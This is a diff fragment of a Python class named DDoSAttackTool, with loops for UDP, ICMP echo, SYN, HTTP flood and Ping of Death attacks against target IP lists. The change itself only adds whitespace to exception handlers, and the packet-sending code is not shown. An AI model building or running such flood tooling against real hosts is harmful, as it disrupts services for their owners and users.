@@ -86,7 +86,7 @@ class DDoSAttackTool:
                     print(f"Sent {self.attack_num} packet to {target} through port: {port}")
                     time.sleep(burst_interval)
                 port = (port + 1) % 65535  # Move this line outside the inner loop
-        except Exception as e:
+        except  Exception as  e:
             print("An error occurred during the UDP flood attack:", e)
 
     def icmp_echo_attack(self, target_ips, num_packets, burst_interval):
@@ -97,7 +97,7 @@ class DDoSAttackTool:
                     self.attack_num += 1
                     print(f"Sent {self.attack_num} ICMP echo request to {target}")
                     time.sleep(burst_interval)
-        except Exception as e:
+        except  Exception as  e:
             print("An error occurred during the ICMP echo attack:", e)
 
     def syn_flood_attack(self, target_ips, port, num_packets, burst_interval):
@@ -109,7 +109,7 @@ class DDoSAttackTool:
                     port = (port + 1) % 65535
                     print(f"Sent {self.attack_num} SYN packet to {target} through port: {port}")
                     time.sleep(burst_interval)
-        except Exception as e:
+        except  Exception as  e:
             print("An error occurred during the SYN flood attack:", e)
 
     def http_flood_attack(self, target_ips, port, num_packets, burst_interval):
@@ -128,7 +128,7 @@ class DDoSAttackTool:
                         print(f"Sent {self.attack_num} HTTP request to {url}")
                         time.sleep(burst_interval)
                         bar.update(i + 1)
-        except Exception as e:
+        except  Exception as  e:
             print("An error occurred during the HTTP flood attack:", e)
 
     def ping_of_death_attack(self, target_ips, num_packets, burst_interval):
@@ -139,7 +139,7 @@ class DDoSAttackTool:
                     self.attack_num += 1
                     print(f"Sent {self.attack_num} oversized ICMP packet to {target}")
                     time.sleep(burst_interval)
-        except Exception as e:
+        except  Exception as  e:
             print("An error occurred during the Ping of Death attack:", e)
 
     def run(self):
